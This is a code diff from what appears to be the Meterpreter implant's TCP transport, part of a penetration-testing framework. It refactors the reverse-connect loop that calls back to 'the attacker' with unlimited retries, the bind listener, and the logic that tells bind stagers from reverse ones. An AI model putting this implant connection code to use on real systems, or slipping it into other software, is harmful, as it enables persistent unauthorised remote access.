@@ -15,11 +15,44 @@
 extern IN6_ADDR in6addr_any;
 #endif
 
-/*! @brief Number of milliseconds to wait before connection retries. */
-const DWORD RETRY_TIMEOUT_MS = 1000;
+/*!
+ * @brief Number of milliseconds to wait before connection retries.
+ * @remark This will soon become configurable.
+ */
+const DWORD RETRY_TIMEOUT_MS = 5000;
 
 /*! @brief An array of locks for use by OpenSSL. */
 static LOCK ** ssl_locks = NULL;
+
+/*!
+ * @brief Perform the reverse_tcp connect.
+ * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
+ * @param sockAddr The SOCKADDR structure which contains details of the connection.
+ * @param sockAddrSize The size of the \c sockAddr structure.
+ * @param retryAttempts The number of times to retry the connection (-1 == INFINITE).
+ * @param retryTimeout The number of milliseconds to wait for each connection attempt.
+ * @return Indication of success or failure.
+ */
+static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, int retryAttempts, DWORD retryTimeout)
+{
+	DWORD result = ERROR_SUCCESS;
+	do
+	{
+		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
+		{
+			break;
+		}
+
+		Sleep(retryTimeout);
+	} while (retryAttempts == -1 || retryAttempts-- > 0);
+
+	if (result == SOCKET_ERROR)
+	{
+		closesocket(reverseSocket);
+	}
+
+	return result;
+}
 
 /*!
  * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
@@ -49,22 +82,14 @@ static DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, S
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
 
-	// try connect to the attacker at least once
-	while (connect(socketHandle, (SOCKADDR*)&sock, sizeof(sock)) == SOCKET_ERROR)
-	{
-		// retry with a sleep if it fails, or exit the process on failure
-		if (retryAttempts-- <= 0)
-		{
-			closesocket(socketHandle);
-			return WSAGetLastError();
-		}
+	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryAttempts, RETRY_TIMEOUT_MS);
 
-		Sleep(RETRY_TIMEOUT_MS);
+	if (result == ERROR_SUCCESS)
+	{
+		*socketBuffer = socketHandle;
 	}
 
-	*socketBuffer = socketHandle;
-
-	return ERROR_SUCCESS;
+	return result;
 }
 
 /*!
@@ -106,15 +131,14 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		return WSAGetLastError();
 	}
 
-	dprintf("[STAGELESS IPV6] Socket successfully created");
-	while (retryAttempts-- > 0)
+	DWORD result = ERROR_SUCCESS;
+	do
 	{
-		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
 		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
 		{
 			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;
 
-			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
+			if ((result = connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
 			{
 				dprintf("[STAGELESS IPV6] Socket successfully connected");
 				*socketBuffer = socketHandle;
@@ -124,12 +148,54 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		}
 
 		Sleep(RETRY_TIMEOUT_MS);
-	}
+	} while (retryAttempts == -1 || retryAttempts-- > 0);
 
 	closesocket(socketHandle);
 	freeaddrinfo(addresses);
-	return WSAGetLastError();
 
+	return result;
+}
+
+/*!
+ * @brief Perform the bind_tcp process.
+ * @param listenSocket The existing listen socket that refers to the remote host connection, closed before returning.
+ * @param sockAddr The SOCKADDR structure which contains details of the connection.
+ * @param sockAddrSize The size of the \c sockAddr structure.
+ * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
+ * @return Indication of success or failure.
+ */
+static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
+{
+	DWORD result = ERROR_SUCCESS;
+	do
+	{
+		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
+		{
+			result = WSAGetLastError();
+			break;
+		}
+
+		if (listen(listenSocket, 1) == SOCKET_ERROR)
+		{
+			result = WSAGetLastError();
+			break;
+		}
+
+		// Setup, ready to go, now wait for the connection.
+		SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
+
+		if (acceptSocket == INVALID_SOCKET)
+		{
+			result = WSAGetLastError();
+			break;
+		}
+
+		*acceptSocketBuffer = acceptSocket;
+	} while (0);
+
+	closesocket(listenSocket);
+
+	return result;
 }
 
 /*!
@@ -197,29 +263,7 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		sockAddr.sin6_port = htons(port);
 	}
 
-	if (bind(listenSocket, (SOCKADDR *)&sockAddr, (v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6))) == SOCKET_ERROR)
-	{
-		return WSAGetLastError();
-	}
-
-	if (listen(listenSocket, 1) == SOCKET_ERROR)
-	{
-		return WSAGetLastError();
-	}
-
-	// Setup, ready to go, now wait for the connection.
-	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
-
-	// don't bother listening for other connections
-	closesocket(listenSocket);
-
-	if (acceptSocket == INVALID_SOCKET)
-	{
-		return WSAGetLastError();
-	}
-
-	*socketBuffer = acceptSocket;
-	return ERROR_SUCCESS;
+	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
 }
 
 /*!
@@ -271,7 +315,7 @@ static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file,
  */
 static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
 {
-	LOCK * lock = (LOCK *)l;
+	LOCK* lock = (LOCK *)l;
 
 	if (mode & CRYPTO_LOCK)
 	{
@@ -291,7 +335,7 @@ static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, co
  */
 static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
 {
-	lock_destroy((LOCK *)l);
+	lock_destroy((LOCK*)l);
 }
 
 /*!
@@ -582,7 +626,7 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  * @param transport Pointer to the TCP transport containing the socket.
  * @return The current transport socket FD, if any, or zero.
  */
-static SOCKET tcp_transport_get_socket(Transport* transport)
+static SOCKET transport_get_socket_tcp(Transport* transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
 	{
@@ -621,6 +665,138 @@ static void transport_reset_tcp(Transport* transport)
 			closesocket(ctx->fd);
 		}
 		ctx->fd = 0;
+	}
+}
+
+/*!
+ * @brief Attempt to determine if the stager connection was a bind or reverse connection.
+ * @param ctx Pointer to the current \c TcpTransportContext.
+ * @param sock The socket file descriptor passed in to metsrv.
+ * @remark This function always "succeeds" because the fallback case is reverse_tcp.
+ */
+static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
+{
+	// if we get here it means that we've been given a socket from the stager. So we need to stash
+	// that in our context. Once we've done that, we need to attempt to infer whether this conn
+	// was created via reverse or bind, so that we can do the same thing later on if the transport
+	// fails for some reason.
+	SOCKET listenSocket;
+
+	ctx->fd = sock;
+
+	// default to reverse socket
+	ctx->bound = FALSE;
+
+	// for sockets that were handed over to us, we need to persist some information about it so that
+	// we can reconnect after failure. To support this, we need to first get the socket information
+	// which gives us addresses and port information
+	ctx->sock_desc_size = sizeof(ctx->sock_desc);
+	if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
+	{
+#ifdef DEBUGTRACE
+		if (ctx->sock_desc.ss_family == AF_INET)
+		{
+			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
+		}
+		else
+		{
+			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
+		}
+#endif
+	}
+	else
+	{
+		dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
+	}
+
+	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
+	// Loop backwards from our current socket FD number
+	for (int i = 1; i <= 16; ++i)
+	{
+		// Windows socket handles are always multiples of 4 apart.
+		listenSocket = ctx->fd - i * 4;
+
+		vdprintf("[STAGED] Checking socket fd %u", listenSocket);
+
+		BOOL isListening = FALSE;
+		int isListeningLen = sizeof(isListening);
+		if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
+		{
+			dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
+			continue;
+		}
+
+		if (!isListening)
+		{
+			dprintf("[STAGED] Socket appears to NOT be listening");
+			continue;
+		}
+
+		// try to get details of the socket address
+		struct sockaddr_storage listenStorage;
+		int listenStorageSize = sizeof(listenStorage);
+		if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
+		{
+			vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
+			continue;
+		}
+
+		// on finding a socket, see if it matches the family of our current socket
+		if (listenStorage.ss_family != ctx->sock_desc.ss_family)
+		{
+			vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
+			continue;
+		}
+
+		// if it's the same, and we are on the same local port, we can assume that there's a bind listener
+		if (listenStorage.ss_family == AF_INET)
+		{
+			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
+			{
+				vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
+				ctx->bound = TRUE;
+				break;
+			}
+			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
+		}
+		else if (listenStorage.ss_family == AF_INET6)
+		{
+			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
+			{
+				vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
+				ctx->bound = TRUE;
+				break;
+			}
+			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
+		}
+	}
+
+	if (ctx->bound)
+	{
+		// store the details of the listen socket so that we can use it again
+		ctx->sock_desc_size = sizeof(ctx->sock_desc);
+		getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
+
+		// the listen socket that we have been given needs to be tidied up because
+		// the stager doesn't do it
+		closesocket(listenSocket);
+	}
+	else
+	{
+		// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
+		vdprintf("[STAGED] Connection appears to be a reverse connection");
+		ctx->sock_desc_size = sizeof(ctx->sock_desc);
+		getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
+#ifdef DEBUGTRACE
+		if (ctx->sock_desc.ss_family == AF_INET)
+		{
+			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
+		}
+		else
+		{
+			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
+		}
+#endif
 	}
 }
 
@@ -688,60 +864,18 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			dprintf("[STAGED] previous connection was a bind connection");
 			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
 
-			do
-			{
-				if (bind(listenSocket, (SOCKADDR *)&ctx->sock_desc, ctx->sock_desc_size) == SOCKET_ERROR)
-				{
-					result = WSAGetLastError();
-					dprintf("[STAGED] Failed to bind: %u %x", result, result);
-					break;
-				}
-
-				if (listen(listenSocket, 1) == SOCKET_ERROR)
-				{
-					dprintf("[STAGED] Failed to listen: %u %x", result, result);
-					result = WSAGetLastError();
-					break;
-				}
-
-				// Setup, ready to go, now wait for the connection.
-				ctx->fd = accept(listenSocket, NULL, NULL);
-
-				if (ctx->fd == INVALID_SOCKET)
-				{
-					result = GetLastError();
-					dprintf("[STAGED] Failed to listen: %u %x", result, result);
-					break;
-				}
-
-				result = ERROR_SUCCESS;
-			} while (0);
-
-			if (listenSocket != INVALID_SOCKET)
-			{
-				closesocket(listenSocket);
-			}
+			result = bind_tcp_run(listenSocket, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
 		}
 		else
 		{
 			dprintf("[STAGED] previous connection was a reverse connection");
 			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
 
-			result = ERROR_SUCCESS;
+			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, retryAttempts, RETRY_TIMEOUT_MS);
 
-			// try connect to the attacker at least once
-			while (connect(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size) == SOCKET_ERROR)
+			if (result != ERROR_SUCCESS)
 			{
-				// retry with a sleep if it fails, or exit the process on failure
-				if (retryAttempts-- <= 0)
-				{
-					closesocket(ctx->fd);
-					ctx->fd = 0;
-					result = GetLastError();
-					break;
-				}
-
-				Sleep(RETRY_TIMEOUT_MS);
+				ctx->fd = 0;
 			}
 		}
 	}
@@ -751,124 +885,7 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 		// that in our context. Once we've done that, we need to attempt to infer whether this conn
 		// was created via reverse or bind, so that we can do the same thing later on if the transport
 		// fails for some reason.
-		SOCKET listenSocket;
-
-		ctx->fd = sock;
-
-		// default to reverse socket
-		ctx->bound = FALSE;
-
-		// for sockets that were handed over to us, we need to persist some information about it so that
-		// we can reconnect after failure. To support this, we need to first get the socket information
-		// which gives us addresses and port information
-		ctx->sock_desc_size = sizeof(ctx->sock_desc);
-		if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
-		{
-#ifdef DEBUGTRACE
-			if (ctx->sock_desc.ss_family == AF_INET)
-			{
-				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
-			}
-			else
-			{
-				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-			}
-#endif
-		}
-		else
-		{
-			dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
-		}
-
-		// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
-		// Loop backwards from our current socket FD number
-		for (int i = 1; i <= 16; ++i)
-		{
-			// Windows socket handles are always multiples of 4 apart.
-			listenSocket = ctx->fd - i * 4;
-
-			vdprintf("[STAGED] Checking socket fd %u", listenSocket);
-
-			BOOL isListening = FALSE;
-			int isListeningLen = sizeof(isListening);
-			if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
-			{
-				dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
-				continue;
-			}
-
-			if (!isListening)
-			{
-				dprintf("[STAGED] Socket appears to NOT be listening");
-				continue;
-			}
-
-			// try to get details of the socket address
-			struct sockaddr_storage listenStorage;
-			int listenStorageSize = sizeof(listenStorage);
-			if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
-			{
-				vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
-				continue;
-			}
-
-			// on finding a socket, see if it matches the family of our current socket
-			if (listenStorage.ss_family != ctx->sock_desc.ss_family)
-			{
-				vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
-				continue;
-			}
-
-			// if it's the same, and we are on the same local port, we can assume that there's a bind listener
-			if (listenStorage.ss_family == AF_INET)
-			{
-				if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
-				{
-					vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
-					ctx->bound = TRUE;
-					break;
-				}
-				vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
-			}
-			else if (listenStorage.ss_family == AF_INET6)
-			{
-				if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
-				{
-					vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
-					ctx->bound = TRUE;
-					break;
-				}
-				vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
-			}
-		}
-
-		if (ctx->bound)
-		{
-			// store the details of the listen socket so that we can use it again
-			ctx->sock_desc_size = sizeof(ctx->sock_desc);
-			getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-
-			// the listen socket that we have been given needs to be tidied up because
-			// the stager doesn't do it
-			closesocket(listenSocket);
-		}
-		else
-		{
-			// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
-			vdprintf("[STAGED] Connection appears to be a reverse connection");
-			ctx->sock_desc_size = sizeof(ctx->sock_desc);
-			getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-#ifdef DEBUGTRACE
-			if (ctx->sock_desc.ss_family == AF_INET)
-			{
-				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
-			}
-			else
-			{
-				dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-			}
-#endif
-		}
+		infer_staged_connection_type(ctx, sock);
 	}
 
 	if (result != ERROR_SUCCESS)
@@ -920,7 +937,7 @@ Transport* transport_create_tcp(wchar_t* url)
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch_tcp;
-	transport->get_socket = tcp_transport_get_socket;
+	transport->get_socket = transport_get_socket_tcp;
 	transport->ctx = ctx;
 	transport->type = METERPRETER_TRANSPORT_SSL;
 
